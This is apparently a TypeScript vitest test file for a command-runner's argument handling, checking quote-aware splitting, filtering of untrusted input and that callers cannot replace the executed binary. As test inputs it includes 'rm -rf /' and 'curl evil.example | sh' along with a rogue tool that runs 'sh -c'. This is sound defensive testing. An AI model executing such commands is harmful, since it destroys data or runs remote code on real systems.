/**
 * The argument boundary.
 *
 * Two of these cover how a typed line becomes argv entries. The other two
 * cover the security rule the web view's `/run` depends on: what a caller
 * may add to a spawn, and what it may not. `serve.test.ts` covers the route.
 */

import { describe, expect, test } from 'vitest'
import type { Task } from '@osdlc/system-model/detect'

import type { ToolDef } from '@osdlc/system-model/detect'

import { acceptArgs, runArgv, splitArgs } from '../src/args.ts'
import { makeProject } from '../src/catalog.ts'

const project = makeProject()

function task(argv: string[], runner = 'just'): Task {
  return {
    id: `${runner}:deploy`,
    runner,
    path: ['just', 'deploy'],
    argv,
    cwd: '.',
    display: argv.join(' ') + ' <env>',
    parameters: [{ name: 'env', required: true, variadic: false }],
    source: 'justfile',
    origin: 'declared',
    tags: [],
    persistent: { value: false, declared: false },
    executes: 'local',
  }
}

describe('splitArgs', () => {
  test('splits on whitespace', () => {
    expect(splitArgs('staging latest')).toEqual(['staging', 'latest'])
  })

  test('a quoted value with a space stays ONE argument', () => {
    // The only reason this is not `.split(/\s+/)`. Two arguments here would be
    // a different command than the one the user read back on their own line.
    expect(splitArgs('deploy "two words" tail')).toEqual(['deploy', 'two words', 'tail'])
    expect(splitArgs("deploy 'two words'")).toEqual(['deploy', 'two words'])
  })

  test('a backslash escapes the next character', () => {
    expect(splitArgs('two\\ words')).toEqual(['two words'])
  })

  test('leading, trailing and repeated whitespace produce no empty arguments', () => {
    expect(splitArgs('   a    b  ')).toEqual(['a', 'b'])
    expect(splitArgs('')).toEqual([])
    expect(splitArgs('   ')).toEqual([])
  })

  test('an empty quoted string IS an argument', () => {
    // `--message ""` is a real thing to pass, and dropping it would silently
    // change the command into one with a missing argument.
    expect(splitArgs('--message ""')).toEqual(['--message', ''])
  })

  test('an unterminated quote keeps what was typed', () => {
    // The user is mid-word. Losing their text would be worse than passing a
    // token they can see in the command echoed above the run.
    expect(splitArgs('deploy "half')).toEqual(['deploy', 'half'])
  })

  test('shell syntax is text, not syntax', () => {
    // Nothing here ever reaches a shell: the result goes to an execvp-style
    // spawn as separate argv entries. A glob or a redirect is passed through
    // as the characters somebody typed.
    expect(splitArgs('*.log > out.txt && rm -rf /')).toEqual([
      '*.log',
      '>',
      'out.txt',
      '&&',
      'rm',
      '-rf',
      '/',
    ])
  })
})

describe('acceptArgs — what an untrusted body may contribute', () => {
  test('a list of strings passes through', () => {
    expect(acceptArgs(['staging', 'latest'])).toEqual(['staging', 'latest'])
  })

  test('anything that is not an array becomes no arguments', () => {
    for (const value of [undefined, null, 'staging', 7, { 0: 'staging' }]) {
      expect(acceptArgs(value)).toEqual([])
    }
  })

  test('non-string elements are dropped, not coerced', () => {
    // `String(value)` would hand a spawn "[object Object]" or "null" as a real
    // argument. An argument nobody typed is worse than a missing one.
    expect(acceptArgs(['ok', 7, null, {}, ['nested'], 'fine'])).toEqual(['ok', 'fine'])
  })
})

describe("runArgv — arguments bound by the task's tool, the binary the catalog's", () => {
  test("just appends the caller's arguments", () => {
    expect(runArgv(project, task(['just', 'deploy']), ['staging'])).toEqual([
      'just',
      'deploy',
      'staging',
    ])
  })

  test('npm run puts them after --, where npm passes them to the script', () => {
    const npm = task(['npm', 'run', 'test'], 'node-scripts')
    expect(runArgv(project, npm, ['--watch'])).toEqual(['npm', 'run', 'test', '--', '--watch'])
  })

  test('cargo run puts them after --', () => {
    expect(runArgv(project, task(['cargo', 'run'], 'cargo'), ['--flag'])).toEqual([
      'cargo',
      'run',
      '--',
      '--flag',
    ])
  })

  test('no arguments leaves the command exactly as the catalog has it', () => {
    expect(runArgv(project, task(['npm', 'run', 'build'], 'node-scripts'))).toEqual([
      'npm',
      'run',
      'build',
    ])
  })

  test('a caller cannot replace the binary or any leading argument', () => {
    // The property `/run` rests on. Element 0 is what gets executed, and
    // it comes from a catalog this process built by reading the repository.
    const argv = runArgv(project, task(['just', 'deploy']), ['curl', 'evil.example', '|', 'sh'])
    expect(argv.slice(0, 2)).toEqual(['just', 'deploy'])
  })

  test('a tool whose invoke swaps the binary is refused', () => {
    const rogue: ToolDef = {
      id: 'rogue',
      roles: {
        runner: {
          kind: 'parse',
          collect: async () => ({ status: 'absent', tasks: [], diagnostics: [] }),
          invoke: (_t, args) => ['sh', '-c', ...args],
        },
      },
    }
    const withRogue = makeProject([rogue])
    expect(() => runArgv(withRogue, task(['rogue', 'x'], 'rogue'), ['id'])).toThrow(/binary/)
  })

  test("the task's own argv is not mutated", () => {
    const t = task(['npm', 'run', 'x'], 'node-scripts')
    runArgv(project, t, ['--flag'])
    expect(t.argv).toEqual(['npm', 'run', 'x'])
  })
})
